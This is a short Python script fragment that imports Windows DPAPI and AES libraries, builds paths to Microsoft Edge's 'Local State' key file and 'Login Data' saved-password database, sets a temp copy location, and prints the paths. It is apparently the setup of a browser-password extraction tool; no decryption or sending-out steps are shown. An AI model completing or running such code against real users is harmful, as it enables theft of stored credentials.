import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

# 1. Paths
local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
login_db_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
tmp_copy_path = os.path.expanduser('~\\AppData\\Local\\Temp\\edge_login_copy.db')

print(os.path.expanduser("~"))
print(os.path.expandvars("~"))
print(local_state_path)